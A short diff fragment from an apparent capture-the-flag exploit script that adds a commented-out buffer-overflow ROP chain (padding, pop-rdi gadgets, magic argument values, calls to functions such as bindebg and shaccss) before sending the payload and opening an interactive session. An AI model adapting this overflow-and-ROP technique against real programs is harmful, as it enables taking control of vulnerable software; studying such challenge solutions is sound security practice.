@@ -28,6 +28,23 @@ def exploit():
     payload += success_msg
     payload += debug_mode
 
+    '''
+    payload = ""
+    payload += "A" * padding
+    payload += p64(poprdi)
+    payload += p64(0xDEADBAAD)
+    payload += p64(bindebg)
+    payload += p64(poprdi)
+    payload += p64(0xDEADFABE)
+    payload += p64(shaccss)
+    payload += p64(poprdi)
+    payload += p64(0x155C1F/0x539)
+    payload += p64(message)
+    payload += p64(success_msg)
+    payload += p64(debug_mode)
+    '''
+
+
     p.sendline(payload)
     p.interactive()
 
